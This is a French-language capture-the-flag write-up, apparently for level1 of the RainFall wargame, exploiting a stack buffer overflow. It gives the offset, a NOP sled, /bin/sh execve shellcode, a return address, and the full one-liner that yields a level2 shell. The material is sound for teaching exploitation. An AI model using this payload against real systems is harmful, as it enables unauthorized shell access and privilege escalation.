(python -c 'print("A"*76 + "BBBB")') | ./level1

segfault et met BBBB dans return value

shellcode: \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
76 + 4(adresse) de longueur et shellcode 46
76 - 46(shellcode) = 30

Donc input:

30 \x90 + shellcode + adresse

memoire: 

0xbffff6e8:     0x3c    0xf7    0xff    0xbf    0xf4    0x0f    0xfd    0xb7
0xbffff6f0:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff6f8:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff700:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xbffff708:     0x90    0x90    0x90    0x90    0x90    0x90    0x31    0xc0
0xbffff710:     0xb0    0x46    0x31    0xdb    0x31    0xc9    0xcd    0x80
on prends donc une adresse entre les deux 
(car memoire peut retrecire)

adresse = 0xbffff708

final: (python -c 'print("\x90"*30 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x08\xf7\xff\xbf")')

mais juste ca ferme le shell a cause de l'utilisation
de stdin dans le programme

if faut donc faire:

level1@RainFall:~$ ((python -c 'print("\x90"*30 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x08\xf7\xff\xbf")'); cat) | /home/user/level1/level1
whoami
level2

executer level1 avec le chemin absolu est important
cat ./level1 decalerait la stack par 
rapport a gdb.